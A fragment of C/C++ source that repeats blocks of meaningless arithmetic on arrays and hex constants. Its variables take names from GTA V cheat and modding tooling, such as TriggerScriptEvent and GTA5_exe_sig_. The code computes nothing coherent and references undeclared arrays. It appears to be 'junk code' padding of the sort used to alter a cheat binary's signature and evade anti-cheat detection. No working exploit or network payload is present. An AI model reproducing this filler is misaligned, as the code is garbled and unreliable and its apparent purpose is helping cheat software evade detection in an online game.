				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				i = 1000;
			}
			else
			{

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
